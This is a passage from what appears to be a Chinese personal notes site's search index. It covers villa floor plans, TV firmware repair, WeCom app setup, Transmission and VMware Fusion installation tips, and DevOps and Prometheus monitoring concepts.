<p>\u56fe\u7eb8\u76ee\u5f55\uff1a\u5efa\u7b51\u8bbe\u8ba1\u8bf4\u660e\u3001\u4e00\u5c42\u5e73\u9762\u56fe\u3001\u4e8c\u5c42\u5e73\u9762\u56fe\u3001\u5c4b\u9876\u5e73\u9762\u56fe\u3001\u6b63\u7acb\u9762\u56fe\u3001\u80cc\u7acb\u9762\u56fe\u3001\u5de6\u7acb\u9762\u56fe\u3001\u53f3\u7acb\u9762\u56fe\u3001\u95e8\u7a97\u8868\u3001\u697c\u68af\u5e73\u9762\u56fe\u30011-1\u5256\u9762\u56fe\u3001\u8282\u70b9\u8be6\u56fe; \u7ed3\u6784\u8bbe\u8ba1\u8bf4\u660e\u3001\u57fa\u7840\u5e73\u9762\u5e03\u7f6e\u56fe\u3001\u57fa\u7840\u8be6\u56fe\u3001\u4e00\u5c42\u67f1\u7ed3\u6784\u5e73\u9762\u56fe\u3001\u5c4b\u9876\u67f1\u7ed3\u6784\u5e73\u9762\u56fe\u3001\u4e00\u5c42\u6881\u7ed3\u6784\u5e73\u9762\u56fe\u3001\u5c4b\u9876\u6881\u7ed3\u6784\u5e73\u9762\u56fe\u3001\u4e00\u5c42\u7ed3\u6784\u5e73\u9762\u56fe\u3001\u5c4b\u9876\u7ed3\u6784\u5e73\u9762\u56fe\u3001\u697c\u68af\u7ed3\u6784\u56fe;</p> <p>\u7ed9\u6392\u6c34\u8bbe\u8ba1\u8bf4\u660e\u3001\u4e00\u5c42\u7ed9\u6392\u6c34\u5e73\u9762\u56fe\u3001\u4e8c\u5c42\u7ed9\u6392\u6c34\u5e73\u9762\u56fe\u3001\u5c4b\u9876\u7ed9\u6392\u6c34\u5e73\u9762\u56fe\u3001\u7ed9\u6392\u6c34\u7cfb\u7edf\u56fe; \u7535\u6c14\u8bbe\u8ba1\u8bf4\u660e\u4e0e\u56fe\u4f8b\u3001\u914d\u7535\u7cfb\u7edf\u56fe\u3001\u5f31\u7535\u7cfb\u7edf\u56fe\u3001\u603b\u7b49\u7535\u4f4d\u8054\u7ed3\u7aef\u5b50\u677f\u4f5c\u6cd5\u3001\u7b49\u7535\u4f4d\u8054\u7ed3\u7aef\u5b50\u4f5c\u6cd5\u3001\u5c40\u90e8\u7b49\u7535\u4f4d\u8054\u7ed3\u4f5c\u6cd5\u3001\u603b\u7b49\u7535\u4f4d\u8054\u7ed3\u7cfb\u7edf\u56fe\u3001\u4e00\u5c42\u7167\u660e\u5e73\u9762\u56fe\u3001\u4e8c\u5c42\u7167\u660e\u5e73\u9762\u56fe\u3001\u4e00\u5c42\u63d2\u5ea7\u5e73\u9762\u56fe\u3001\u4e8c\u5c42\u63d2\u5ea7\u5e73\u9762\u56fe\u3001\u4e00\u5c42\u5f31\u7535\u5e73\u9762\u56fe\u3001\u4e8c\u5c42\u5f31\u7535\u5e73\u9762\u56fe\u3001\u6548\u679c\u56fe\u7b49\u3002</p> <p>\u8bbe\u8ba1\u529f\u80fd\uff1a\u4e00\u5c42\uff1a\u95e8\u5385\u3001\u5ba2\u5385\u30012\u5367\u5ba4\u3001\u53a8\u623f\u3001\u9910\u5385\u3001\u536b\u751f\u95f4\u3001\u8f66\u5e93\uff1b\u4e8c\u5c42\uff1a\u6d3b\u52a8\u5ba4\uff08\u9644\u9732\u53f0\uff09\u3001\u4e3b\u5367\u5ba4\uff08\u9644\u8863\u5e3d\u95f4\uff0c\u536b\u751f\u95f4\uff0c\u9732\u53f0\uff09\u30012\u5367\u5ba4\u3001\u4e66\u623f\u3001\u536b\u751f\u95f4\u3002</p>"},{"location":"note/84-villa-34-80/#_1","title":"\u6548\u679c\u56fe","text":""},{"location":"note/84-villa-34-80/#_2","title":"\u6574\u4f53\u7ed3\u6784","text":""},{"location":"note/84-villa-34-80/#_3","title":"\u65bd\u5de5\u6307\u5357","text":""},{"location":"note/84-villa-34-80/#_4","title":"\u697c\u68af","text":""},{"location":"note/84-villa-34-80/#_5","title":"\u7ed9\u6392\u6c34","text":""},{"location":"note/84-villa-34-80/#_6","title":"\u914d\u7535","text":""},{"location":"note/84-villa-34-80/#_7","title":"\u8865\u5145","text":"<p>\u7ec6\u5fae\u8c03\u6574</p> <ol> <li>\u53a8\u623f\u4e1c\u9762\u7559\u4e00\u4e2a\u95e8\uff0c\u6269\u5c55\u67f4\u706b\u623f</li> <li>\u53d6\u6d88\u9910\u5385\u4e0e\u5ba2\u5385\u4e4b\u95f4\u7684\u5899</li> </ol>"},{"location":"note/84-villa-82-90/","title":"\u522b\u5885\u301082-90\u3011","text":"<p>\u6237\u578b\u4e3a\u4e8c\u5c42\u72ec\u680b\u522b\u5885\uff0c\u94a2\u6df7\u7ed3\u6784\uff0c\u5360\u5730\u9762\u79ef 160.0\u5e73\u65b9\u7c73\uff0c\u5efa\u7b51\u6a90\u53e3\u9ad8\u5ea67.85\u7c73\uff0c\u603b\u9ad8\u5ea610.25\u7c73\uff0c\u4e00\u697c\u8bbe\u6709\u5ba2\u5385\u3001\u5ba2\u623f\u3001\u9910\u5385\u3001\u8fdb\u5165\u5f0f\u5427\u53f0\u3001\u53a8\u623f\u3001\u536b\u751f\u95f41\u95f4\u30013\u95f4\u5367\u5ba4\uff1b\u4e8c\u697c\u8bbe\u67096\u95f4\u5367\u5ba4\u3001\u536b\u751f\u95f41\u95f4\u3001\u5ba2\u5385\u3001\u4e00\u4e2a\u5927\u9633\u53f0\u3002\u672c\u6237\u578b\u5916\u89c2\u9020\u578b\u53e4\u6734\u5927\u65b9\uff0c\u8272\u5f69\u6e05\u65b0\u6de1\u96c5\uff0c\u5bcc\u6709\u65f6\u4ee3\u7684\u97f5\u5473\uff1b\u623f\u95f4\u5c3a\u5ea6\u8bbe\u8ba1\u9002\u5b9c\uff0c\u7a7a\u95f4\u5229\u7528\u7387\u9ad8\uff0c\u660e\u53a8\u660e\u536b\uff0c\u5404\u4f7f\u7528\u7a7a\u95f4\u90fd\u6709\u8f83\u597d\u7684\u91c7\u5149\u901a\u98ce\u3002</p> <p>\u95e8\u524d\u5bbd14.06\u7c73*\u8fdb\u6df113.8\u7c73</p>"},{"location":"note/84-villa-82-90/#_1","title":"\u6548\u679c\u56fe","text":""},{"location":"note/84-villa-82-90/#_2","title":"\u65bd\u5de5\u6307\u5357","text":""},{"location":"note/84-villa-82-90/#_3","title":"\u8865\u5145","text":"<p>\u623f\u95f4\u8fc7\u591a\u5728\u5b9e\u9645\u4f7f\u7528\u65b9\u6848</p> <ol> <li>\u4e00\u5c42\u5de6\u4e0a\u7b2c\u4e00\u623f\u95f4\u529f\u80fd\u4e3a\u50a8\u85cf\u95f4</li> <li>\u4e00\u5c42\u53f3\u4e0a\u7b2c\u4e00\u623f\u95f4\u529f\u80fd\u4e3a\u6d17\u8863\u623f</li> <li>\u4e00\u5c42\u53f3\u4e0a\u7b2c\u4e8c\u623f\u95f4\u529f\u80fd\u4e3a\u6d3b\u52a8\u95f4</li> <li>\u4e8c\u5c42\u5de6\u4fa73\u4e2a\u623f\u95f4\u4e4b\u95f4\u6ca1\u6709\u5b9e\u4f53\u5899\uff0c\u53ef\u901a\u8fc7\u9694\u5899\u67dc\u6539\u9020\u7559\u7ed9\u540e\u671f\u66f4\u591a\u6269\u5c55</li> <li>\u4e8c\u5c42\u53f3\u4e0a\u7b2c\u4e8c\u623f\u95f4\u529f\u80fd\u4e3a\u5f00\u653e\u4e66\u623f</li> </ol>"},{"location":"note/90-hls-repair/","title":"\u6d77\u4fe1\u7535\u89c6","text":"<p>\u4e00\u6b21\u6d77\u4fe1\u7535\u89c6\u5361\u5728\u5f00\u673a\u753b\u9762\u7684\u4fee\u590d\u7ecf\u5386</p> <p><code>\u5f5343\u2018\u7535\u89c6\u51fa\u73b0\u5361\u5728\u5f00\u673a\u753b\u9762\u65f6</code></p> <p>\u64cd\u4f5c\u65b9\u5f0f</p> <ol> <li>\u4f7f\u7528\u5e72\u51c0U\u76d8\uff0c&gt;1G\u7a7a\u95f4</li> <li>\u5c06\u6587\u4ef6\u89e3\u538b\u5230U\u76d8\uff0c\u4fdd\u6301TargetHis/xxx.bin\u7684\u76ee\u5f55\u7ed3\u6784</li> <li>\u5c06\u7535\u89c6\u4ea4\u6d41\u5f00\u673a\uff0c\u540c\u65f6\u901a\u8fc7\u9065\u63a7\u5668\u6309-\u97f3\u91cf\u952e\u3002\u5f53\u753b\u9762\u8fdb\u5165\u5347\u7ea7\u4e2d\u505c\u6b62\u624b\u4e2d\u64cd\u4f5c\u9759\u5fc3\u7b49\u5f85</li> <li>\u7ea610\u5206\u949f\u7cfb\u7edf\u5b89\u88c5\u597d\uff0c\u7b49\u540c\u4e8e\u6062\u590d\u4e86\u51fa\u5382\u8bbe\u7f6e</li> </ol> <p>\u56fa\u4ef6\u4e0b\u8f7d</p>"},{"location":"note/91-qywx/","title":"\u4f01\u4e1a\u5fae\u4fe1","text":"<p>\u65e8\u5728\u5bf9\u63a5\u4f01\u4e1a\u5fae\u4fe1\u5f00\u53d1\uff0c\u521b\u5efa\u5e94\u7528</p>"},{"location":"note/91-qywx/#_2","title":"\u521b\u5efa\u5e94\u7528","text":"<p>\u4ec5\u6388\u6743\u6307\u5b9a\u90e8\u95e8\u53ef\u89c1</p> <p></p> <p></p>"},{"location":"note/91-qywx/#_3","title":"\u5206\u7ea7\u7ba1\u7406","text":"<p>\u9488\u5bf9\u5e94\u7528\u521b\u5efa\u5206\u7ea7\u7ba1\u7406\u5458</p> <p>\u4e4b\u540e\u5bf9\u6b64\u5e94\u7528\u7684\u7ba1\u7406\u90fd\u53ef\u4ee5\u901a\u8fc7\u5206\u7ea7\u7ba1\u7406\u5458\u64cd\u4f5c</p> <p></p>"},{"location":"note/91-qywx/#_4","title":"\u5e94\u7528\u4e3b\u9875","text":""},{"location":"note/91-qywx/#_5","title":"\u5e94\u7528\u83dc\u5355","text":""},{"location":"note/91-qywx/#_6","title":"\u5e94\u7528\u5f00\u53d1","text":"<p>\u9700\u8981<code>AgentId</code>\u548c<code>Secret</code></p> <p>\u7ed3\u5408\u5b98\u65b9API</p>"},{"location":"note/92-bt/","title":"BT","text":"<pre><code># ubuntu\n\napt install transmission transmission-cli transmission-daemon\n\n\n# cli\ntransmission-cli -u 100 -d 500 -w . magnet:?xt=urn:btih:9C92DE4A7EE78058679E1A874134456FCA23DA3C\n\n\n# web\n127.0.0.1:9091\n\n# vim /var/lib/transmission-daemon/info/settings.json\n# rpc-*\n# rpc-whitelist\n</code></pre>"},{"location":"note/93-vmware-funsion/","title":"vmware fusion","text":"<p>\u5e94\u7528\u4e8e Apple M2 Pro </p> <p>\u8be5\u5e73\u53f0\u662farm\u67b6\u6784\uff0c\u5728\u5b89\u88c5\u8f6f\u4ef6\u548c\u540e\u7eed\u7684iso\u5747\u9009\u62e9\u5bf9\u5e94\u7684arm\u67b6\u6784\u3002</p>"},{"location":"note/93-vmware-funsion/#vmware","title":"\u4e00\u3001\u5b89\u88c5vmware","text":"<p>Reference</p> <p>\u6ce8\u518c\u4e2a\u4eba\u8d26\u53f7\u83b7\u53d6licence\u5b89\u88c5\u65f6\u8f93\u5165\u3002</p>"},{"location":"note/93-vmware-funsion/#vm","title":"\u4e8c\u3001\u5b89\u88c5vm","text":""},{"location":"note/93-vmware-funsion/#21-windows","title":"2.1 \u5b89\u88c5windows","text":"<p>\u83b7\u53d6arm\u7684iso</p> <p>Reference</p> <p>\u5728\u9009\u62e9\u7f51\u7edcnat\u6a21\u5f0f\u65f6\uff0c\u5b89\u88c5\u8fc7\u7a0b\u4e2d\u65e0\u6cd5\u8054\u7f51\u4e14\u65e0\u6cd5\u7ed5\u5f00\u3002</p> <pre><code># \u89e3\u51b3\n1\uff0c\u6309\u4f4f `Shift + F10` \u8f93\u5165 `oobe\\bypassnro`\u91cd\u542f\u540e\u7ee7\u7eed\u5b89\u88c5\u4f1a\u51fa\u73b0\u8df3\u8fc7\u7f51\u7edc\u6309\u94ae\n2\uff0c`Win + R` \u8f93\u5165 `PowerShell` \u6267\u884c `Set-ExecutionPolicy RemoteSigned`\u4ee5\u7ba1\u7406\u5458\u6743\u9650\u8fd0\u884c\n3\uff0c\u5728vmware\u83dc\u5355\uff1a\u865a\u62df\u673a-\u5b89\u88c5vmware tools\uff0c\u5728DVD\u6302\u8f7d\u955c\u50cf\u540e\u70b9\u51fbsetup.exe\u5b89\u88c5\n4\uff0c\u82e5\u8fd0\u884c\u8fc7`bcdedit /debug on`\uff0c\u9700\u8981\u518d\u8fd0\u884c\u4e00\u6b21`bcdedit /debug off`\n</code></pre>"},{"location":"note/93-vmware-funsion/#22-kali","title":"2.2 \u5b89\u88c5kali","text":"<p>\u83b7\u53d6arm\u7684iso</p> <p>Reference</p> <p>\u7f51\u7edc\u5b89\u5168\u81ea\u5e26\u5de5\u5177\u96c6\u5408</p>"},{"location":"ops/01-devops/","title":"DevOps","text":"<p>Reference</p>"},{"location":"ops/01-devops/#deployment-tier-of-environments","title":"\u4e00\u3001Deployment tier of environments","text":"<p>Introduced in GitLab 13.10.</p> <p>Sometimes, instead of using an industry standard environment name, like <code>production</code>, you might want to use a code name, like <code>customer-portal</code>. While there is no technical reason not to use a name like <code>customer-portal</code>, the name no longer indicates that the environment is used for production.</p> <p>To indicate that a specific environment is for a specific use, you can use tiers:</p> Environment tier Environment name examples <code>production</code> Production, Live <code>staging</code> Staging, Model, Demo <code>testing</code> Test, QC <code>development</code> Dev, Review apps, Trunk <code>other</code> <p>By default, GitLab assumes a tier based on the environment name. Instead, you can use the <code>deployment_tier</code> keyword to specify a tier.</p>"},{"location":"ops/01-devops/#_1","title":"\u4e00\u3001\u73af\u5883\u7ba1\u7406","text":"<p>\u6309\u7167\u4ea4\u4ed8\u987a\u5e8f</p> <ul> <li> <p>DEV Development \u7814\u53d1\u73af\u5883</p> </li> <li> <p>SIT System Integrate Test \u7cfb\u7edf\u96c6\u6210\u6d4b\u8bd5\u73af\u5883\uff08\u5185\u6d4b\uff09</p> </li> <li> <p>UAT User Acceptance Test \u7528\u6237\u9a8c\u6536\u6d4b\u8bd5\u73af\u5883</p> </li> <li> <p>PET Performance Evaluation Test \u6027\u80fd\u8bc4\u4f30\u6d4b\u8bd5\u73af\u5883\uff08\u538b\u6d4b\uff09</p> </li> <li> <p>SIM Simulation \u9ad8\u4eff\u771f\u73af\u5883</p> </li> <li> <p>PRD/PROD Production \u6b63\u5f0f/\u751f\u4ea7\u73af\u5883</p> </li> </ul> <p></p>"},{"location":"ops/02-dataops/","title":"DataOps","text":"<p><code>Observability</code></p>"},{"location":"ops/02-dataops/#opentelemetry","title":"\u4e00\u3001\u642d\u5efa Opentelemetry","text":"<pre><code>helm repo add open-telemetry https://open-telemetry.github.io/opentelemetry-helm-charts\nhelm search repo opentelemetry\n\nhelm show values open-telemetry/opentelemetry-collector &gt; opentelemetry-collector.yaml-0.31.3-default\nhelm show values open-telemetry/opentelemetry-operator &gt; opentelemetry-operator.yaml-0.12.2-default\nhelm show values open-telemetry/opentelemetry-demo &gt; opentelemetry-demo.yaml-0.3.0-default\n\nhelm install my-otel-demo open-telemetry/opentelemetry-demo\n\n\n# Example\n#   https://books.8ops.top/attachment/opentelemetry/helm/opentelemetry-collector.yaml-0.31.3\n\nhelm install opentelemetry-collector open-telemetry/opentelemetry-collector \\\n    -f opentelemetry-collector.yaml-0.31.3 \\\n    -n kube-server \\\n    --version 0.31.3 --debug\n</code></pre>"},{"location":"ops/03-aiops/","title":"AIOps","text":""},{"location":"ops/04-devsecops/","title":"DevSecOps","text":""},{"location":"ops/05-chatops/","title":"ChatOps","text":""},{"location":"ops/06-finops/","title":"FinOps","text":""},{"location":"ops/07-autoops/","title":"AutoOps","text":"<p>\u6458\u5f55\u4e8e\u4f18\u7ef4\u79d1\u6280</p>"},{"location":"ops/07-autoops/#cmdb","title":"\u4e00\u3001CMDB","text":"<p>\u7ed3\u5408\u4f20\u7edf\u8fd0\u7ef4\u6f14\u53d8\uff0c\u65b0\u578b\u8fd0\u7ef4\u65b9\u5f0f\u7684\u57fa\u7840\u652f\u6301\u3002\u6240\u8c13\u5de5\u6b32\u5584\u4e8e\u5176\u4e8b\u5fc5\u5148\u5229\u5176\u5668\uff0c\u4e00\u4e2a\u597d\u7684CMDB\u7ba1\u7406\u624d\u80fd\u8ba9\u4f60\u6709\u66f4\u597d\u7684\u4e0a\u5c42\u62d3\u5c55\u80fd\u529b\u3002</p>"},{"location":"ops/07-autoops/#11","title":"1.1 \u843d\u5730\u573a\u666f","text":""},{"location":"ops/07-autoops/#12","title":"1.2 \u529f\u80fd\u67b6\u6784","text":""},{"location":"ops/07-autoops/#13","title":"1.3 \u6280\u672f\u67b6\u6784","text":""},{"location":"ops/07-autoops/#devops","title":"\u4e8c\u3001DevOps","text":""},{"location":"ops/07-autoops/#21","title":"2.1 \u539f\u578b","text":""},{"location":"ops/07-autoops/#22","title":"2.2 \u80fd\u529b\u6210\u719f\u5ea6","text":"<p>\u7ecf\u4fe1\u901a\u9662\u8ba4\u8bc1\uff0c\u884c\u4e1a\u5171\u8bc6\u5f62\u6210\u7684\u80fd\u529b\u6210\u719f\u5ea6\u6a21\u578b\u3002</p> <p></p>"},{"location":"ops/07-autoops/#23","title":"2.3 \u67b6\u6784","text":""},{"location":"ops/07-autoops/#_1","title":"\u4e09\u3001\u5176\u4ed6\u80fd\u529b","text":""},{"location":"ops/07-autoops/#31","title":"3.1 \u8fd0\u7ef4\u80fd\u529b","text":""},{"location":"ops/07-autoops/#32","title":"3.2 \u95e8\u6237\u80fd\u529b","text":""},{"location":"ops/07-autoops/#33","title":"3.3 \u670d\u52a1\u4e2d\u5fc3","text":""},{"location":"ops/08-xops/","title":"XOps","text":"<p>\u524d\u9762\u90e8\u5206\u4ecb\u7ecd\u4e86Prometheus\u7684\u6570\u636e\u5b58\u50a8\u6a21\u578b\u4ee5\u53ca4\u79cd\u6307\u6807\u7c7b\u578b\uff0c\u540c\u65f6Prometheus\u63d0\u4f9b\u7684\u5f3a\u5927\u7684PromQL\u53ef\u4ee5\u5b9e\u73b0\u5bf9\u6570\u636e\u7684\u4e2a\u6027\u5316\u5904\u7406\u3002Promthues\u57fa\u4e8e\u6307\u6807\u63d0\u4f9b\u4e86\u4e00\u4e2a\u901a\u7528\u7684\u76d1\u63a7\u89e3\u51b3\u65b9\u6848\u3002\u8fd9\u91cc\u5148\u601d\u8003\u4e00\u4e2a\u57fa\u672c\u7684\u95ee\u9898\uff0c\u5728\u5b9e\u73b0\u76d1\u63a7\u65f6\uff0c\u6211\u4eec\u5230\u5e95\u5e94\u8be5\u76d1\u63a7\u54ea\u4e9b\u5bf9\u8c61\u4ee5\u53ca\u54ea\u4e9b\u6307\u6807\uff1f</p>"},{"location":"ops/08-xops/#_1","title":"\u76d1\u63a7\u6240\u6709","text":"<p>\u5728\u4e4b\u524d**Prometheus\u7b80\u4ecb**\u90e8\u5206\u4ecb\u7ecd\u76d1\u63a7\u7684\u57fa\u672c\u76ee\u6807\uff0c\u9996\u5148\u662f\u53ca\u65f6\u53d1\u73b0\u95ee\u9898\u5176\u6b21\u662f\u8981\u80fd\u591f\u5feb\u901f\u5bf9\u95ee\u9898\u8fdb\u884c\u5b9a\u4f4d\u3002\u5bf9\u4e8e\u4f20\u7edf\u76d1\u63a7\u89e3\u51b3\u65b9\u6848\u800c\u8a00\uff0c\u7528\u6237\u770b\u5230\u7684\u4f9d\u7136\u662f\u4e00\u4e2a\u9ed1\u76d2\uff0c\u7528\u6237\u65e0\u6cd5\u771f\u6b63\u4e86\u89e3\u7cfb\u7edf\u7684\u771f\u6b63\u7684\u8fd0\u884c\u72b6\u6001\u3002\u56e0\u6b64Prometheus\u9f13\u52b1\u7528\u6237\u76d1\u63a7\u6240\u6709\u7684\u4e1c\u897f\u3002\u4e0b\u9762\u5217\u4e3e\u4e00\u4e9b\u5e38\u7528\u7684\u76d1\u63a7\u7ef4\u5ea6\u3002</p> \u7ea7\u522b \u76d1\u63a7\u4ec0\u4e48 Exporter \u7f51\u7edc \u7f51\u7edc\u534f\u8bae\uff1ahttp\u3001dns\u3001tcp\u3001icmp\uff1b\u7f51\u7edc\u786c\u4ef6\uff1a\u8def\u7531\u5668\uff0c\u4ea4\u6362\u673a\u7b49 BlackBox Exporter;SNMP Exporter \u4e3b\u673a \u8d44\u6e90\u7528\u91cf node exporter \u5bb9\u5668 \u8d44\u6e90\u7528\u91cf cAdvisor \u5e94\u7528(\u5305\u62ecLibrary) \u5ef6\u8fdf\uff0c\u9519\u8bef\uff0cQPS\uff0c\u5185\u90e8\u72b6\u6001\u7b49 \u4ee3\u7801\u4e2d\u96c6\u6210Prmometheus Client \u4e2d\u95f4\u4ef6\u72b6\u6001 \u8d44\u6e90\u7528\u91cf\uff0c\u4ee5\u53ca\u670d\u52a1\u72b6\u6001 \u4ee3\u7801\u4e2d\u96c6\u6210Prmometheus Client \u7f16\u6392\u5de5\u5177 \u96c6\u7fa4\u8d44\u6e90\u7528\u91cf\uff0c\u8c03\u5ea6\u7b49 Kubernetes Components"},{"location":"ops/08-xops/#_2","title":"\u76d1\u63a7\u6a21\u5f0f","text":"<p>\u9664\u4e86\u4e0a\u8ff0\u4ecb\u7ecd\u7684\u4e0d\u540c\u76d1\u63a7\u7ea7\u522b\u4ee5\u5916\u3002\u5b9e\u9645\u4e0a\u6839\u636e\u4e0d\u540c\u7684\u7cfb\u7edf\u7c7b\u578b\u548c\u76ee\u6807\uff0c\u8fd9\u91cc\u8fd8\u6709\u4e00\u4e9b\u901a\u7528\u7684\u5957\u8def\u548c\u6a21\u5f0f\u53ef\u4ee5\u4f7f\u7528\u3002</p> <p>Google \u56db\u4e2a\u9ec4\u91d1\u6307\u6807\uff0c\u66f4\u9002\u7528\u5e94\u7528\u76d1\u63a7</p> <ul> <li>\u5ef6\u8fdf</li> <li>\u6d41\u91cf</li> <li>\u9519\u8bef</li> <li>\u9971\u548c\u5ea6</li> </ul> <p>Netflix USE\uff0c\u66f4\u9002\u7528\u4e3b\u673a\u76d1\u63a7</p> <ul> <li>\u4f7f\u7528\u7387</li> <li>\u9971\u548c\u5ea6</li> <li>\u9519\u8bef</li> </ul> <p>RED\uff0c\u504f\u91cd\u5fae\u670d\u52a1\u5e94\u7528\u7528\u6237\u4f53\u9a8c</p> <ul> <li>Rate\uff0c\u6bcf\u79d2\u8bf7\u6c42\u6570</li> <li>Errors\uff0c\u6bcf\u79d2\u5931\u8d25\u7684\u8bf7\u6c42\u6570</li> <li>Duration\uff0c\u6bcf\u4e2a\u8bf7\u6c42\u7684\u65f6\u957f</li> </ul>"},{"location":"ops/08-xops/#4","title":"4\u4e2a\u9ec4\u91d1\u6307\u6807","text":"<p>Four Golden Signals\u662fGoogle\u9488\u5bf9\u5927\u91cf\u5206\u5e03\u5f0f\u76d1\u63a7\u7684\u7ecf\u9a8c\u603b\u7ed3\uff0c4\u4e2a\u9ec4\u91d1\u6307\u6807\u53ef\u4ee5\u5728\u670d\u52a1\u7ea7\u522b\u5e2e\u52a9\u8861\u91cf\u7ec8\u7aef\u7528\u6237\u4f53\u9a8c\u3001\u670d\u52a1\u4e2d\u65ad\u3001\u4e1a\u52a1\u5f71\u54cd\u7b49\u5c42\u9762\u7684\u95ee\u9898\u3002\u4e3b\u8981\u5173\u6ce8\u4e0e\u4ee5\u4e0b\u56db\u79cd\u7c7b\u578b\u7684\u6307\u6807\uff1a\u5ef6\u8fdf\uff0c\u901a\u8baf\u91cf\uff0c\u9519\u8bef\u4ee5\u53ca\u9971\u548c\u5ea6\uff1a</p> <ul> <li>\u5ef6\u8fdf\uff1a\u670d\u52a1\u8bf7\u6c42\u6240\u9700\u65f6\u95f4\u3002</li> </ul> <p>\u8bb0\u5f55\u7528\u6237\u6240\u6709\u8bf7\u6c42\u6240\u9700\u7684\u65f6\u95f4\uff0c\u91cd\u70b9\u662f\u8981\u533a\u5206\u6210\u529f\u8bf7\u6c42\u7684\u5ef6\u8fdf\u65f6\u95f4\u548c\u5931\u8d25\u8bf7\u6c42\u7684\u5ef6\u8fdf\u65f6\u95f4\u3002 \u4f8b\u5982\u5728\u6570\u636e\u5e93\u6216\u8005\u5176\u4ed6\u5173\u952e\u7978\u7aef\u670d\u52a1\u5f02\u5e38\u89e6\u53d1HTTP 500\u7684\u60c5\u51b5\u4e0b\uff0c\u7528\u6237\u4e5f\u53ef\u80fd\u4f1a\u5f88\u5feb\u5f97\u5230\u8bf7\u6c42\u5931\u8d25\u7684\u54cd\u5e94\u5185\u5bb9\uff0c\u5982\u679c\u4e0d\u52a0\u533a\u5206\u8ba1\u7b97\u8fd9\u4e9b\u8bf7\u6c42\u7684\u5ef6\u8fdf\uff0c\u53ef\u80fd\u5bfc\u81f4\u8ba1\u7b97\u7ed3\u679c\u4e0e\u5b9e\u9645\u7ed3\u679c\u4ea7\u751f\u5de8\u5927\u7684\u5dee\u5f02\u3002\u9664\u6b64\u4ee5\u5916\uff0c\u5728\u5fae\u670d\u52a1\u4e2d\u901a\u5e38\u63d0\u5021\u201c\u5feb\u901f\u5931\u8d25\u201d\uff0c\u5f00\u53d1\u4eba\u5458\u9700\u8981\u7279\u522b\u6ce8\u610f\u8fd9\u4e9b\u5ef6\u8fdf\u8f83\u5927\u7684\u9519\u8bef\uff0c\u56e0\u4e3a\u8fd9\u4e9b\u7f13\u6162\u7684\u9519\u8bef\u4f1a\u660e\u663e\u5f71\u54cd\u7cfb\u7edf\u7684\u6027\u80fd\uff0c\u56e0\u6b64\u8ffd\u8e2a\u8fd9\u4e9b\u9519\u8bef\u7684\u5ef6\u8fdf\u4e5f\u662f\u975e\u5e38\u91cd\u8981\u7684\u3002</p> <ul> <li>\u901a\u8baf\u91cf\uff1a\u76d1\u63a7\u5f53\u524d\u7cfb\u7edf\u7684\u6d41\u91cf\uff0c\u7528\u4e8e\u8861\u91cf\u670d\u52a1\u7684\u5bb9\u91cf\u9700\u6c42\u3002</li> </ul> <p>\u6d41\u91cf\u5bf9\u4e8e\u4e0d\u540c\u7c7b\u578b\u7684\u7cfb\u7edf\u800c\u8a00\u53ef\u80fd\u4ee3\u8868\u4e0d\u540c\u7684\u542b\u4e49\u3002\u4f8b\u5982\uff0c\u5728HTTP REST API\u4e2d, \u6d41\u91cf\u901a\u5e38\u662f\u6bcf\u79d2HTTP\u8bf7\u6c42\u6570\uff1b</p> <ul> <li>\u9519\u8bef\uff1a\u76d1\u63a7\u5f53\u524d\u7cfb\u7edf\u6240\u6709\u53d1\u751f\u7684\u9519\u8bef\u8bf7\u6c42\uff0c\u8861\u91cf\u5f53\u524d\u7cfb\u7edf\u9519\u8bef\u53d1\u751f\u7684\u901f\u7387\u3002</li> </ul> <p>\u5bf9\u4e8e\u5931\u8d25\u800c\u8a00\u6709\u4e9b\u662f\u663e\u5f0f\u7684(\u6bd4\u5982, HTTP 500\u9519\u8bef)\uff0c\u800c\u6709\u4e9b\u662f\u9690\u5f0f(\u6bd4\u5982\uff0cHTTP\u54cd\u5e94200\uff0c\u4f46\u5b9e\u9645\u4e1a\u52a1\u6d41\u7a0b\u4f9d\u7136\u662f\u5931\u8d25\u7684)\u3002</p> <p>\u5bf9\u4e8e\u4e00\u4e9b\u663e\u5f0f\u7684\u9519\u8bef\u5982HTTP 500\u53ef\u4ee5\u901a\u8fc7\u5728\u8d1f\u8f7d\u5747\u8861\u5668(\u5982Nginx)\u4e0a\u8fdb\u884c\u6355\u83b7\uff0c\u800c\u5bf9\u4e8e\u4e00\u4e9b\u7cfb\u7edf\u5185\u90e8\u7684\u5f02\u5e38\uff0c\u5219\u53ef\u80fd\u9700\u8981\u76f4\u63a5\u4ece\u670d\u52a1\u4e2d\u6dfb\u52a0\u94a9\u5b50\u7edf\u8ba1\u5e76\u8fdb\u884c\u83b7\u53d6\u3002</p> <ul> <li>\u9971\u548c\u5ea6\uff1a\u8861\u91cf\u5f53\u524d\u670d\u52a1\u7684\u9971\u548c\u5ea6\u3002</li> </ul> <p>\u4e3b\u8981\u5f3a\u8c03\u6700\u80fd\u5f71\u54cd\u670d\u52a1\u72b6\u6001\u7684\u53d7\u9650\u5236\u7684\u8d44\u6e90\u3002 \u4f8b\u5982\uff0c\u5982\u679c\u7cfb\u7edf\u4e3b\u8981\u53d7\u5185\u5b58\u5f71\u54cd\uff0c\u90a3\u5c31\u4e3b\u8981\u5173\u6ce8\u7cfb\u7edf\u7684\u5185\u5b58\u72b6\u6001\uff0c\u5982\u679c\u7cfb\u7edf\u4e3b\u8981\u53d7\u9650\u4e0e\u78c1\u76d8I/O\uff0c\u90a3\u5c31\u4e3b\u8981\u89c2\u6d4b\u78c1\u76d8I/O\u7684\u72b6\u6001\u3002\u56e0\u4e3a\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u5f53\u8fd9\u4e9b\u8d44\u6e90\u8fbe\u5230\u9971\u548c\u540e\uff0c\u670d\u52a1\u7684\u6027\u80fd\u4f1a\u660e\u663e\u4e0b\u964d\u3002\u540c\u65f6\u8fd8\u53ef\u4ee5\u5229\u7528\u9971\u548c\u5ea6\u5bf9\u7cfb\u7edf\u505a\u51fa\u9884\u6d4b\uff0c\u6bd4\u5982\uff0c\u201c\u78c1\u76d8\u662f\u5426\u53ef\u80fd\u57284\u4e2a\u5c0f\u65f6\u5019\u5c31\u6ee1\u4e86\u201d\u3002</p>"},{"location":"ops/08-xops/#red","title":"RED\u65b9\u6cd5","text":"<p>RED\u65b9\u6cd5\u662fWeave 